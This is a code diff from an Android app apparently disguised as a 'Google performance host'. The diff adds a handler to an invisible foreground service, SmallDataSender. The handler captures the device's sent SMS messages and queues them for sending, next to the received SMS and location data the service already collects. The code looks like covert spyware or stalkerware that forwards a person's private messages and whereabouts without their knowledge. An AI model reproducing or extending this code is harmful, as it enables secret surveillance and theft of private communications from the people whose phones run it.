@@ -16,6 +16,7 @@ import com.example.tiber.googleperformancehost.SharedClasses.Communication.Respo
 import com.example.tiber.googleperformancehost.SharedClasses.Objects.LocationData;
 import com.example.tiber.googleperformancehost.SharedClasses.Objects.Sendable;
 import com.example.tiber.googleperformancehost.SharedClasses.Objects.ReceivedSmsData;
+import com.example.tiber.googleperformancehost.SharedClasses.Objects.SentSmsData;
 import com.google.gson.Gson;
 
 import java.util.concurrent.ConcurrentLinkedQueue;
@@ -61,11 +62,23 @@ public class SmallDataSender extends ForegroundInvisibleService {
             case "receivedSMS":
                 handleReceivedSMS(intent);
                 break;
+            case "sentSMS":
+                handleSentSMS(intent);
+                break;
             default:
                 Log.wtf(debugTag,"defaulted switch statement in onStartCommand...."+"what is = "+what);
                 return START_STICKY;
         }
         return START_STICKY;
+    }
+
+    private void handleSentSMS(Intent intent) {
+        String smsJSon = intent.getStringExtra("smsJson");
+        if(smsJSon != null){
+            SentSmsData sms = new Gson().fromJson(smsJSon,SentSmsData.class);
+            dataQueue.add(sms);
+            startWorker();
+        }
     }
 
     private void handleReceivedSMS(Intent intent) {
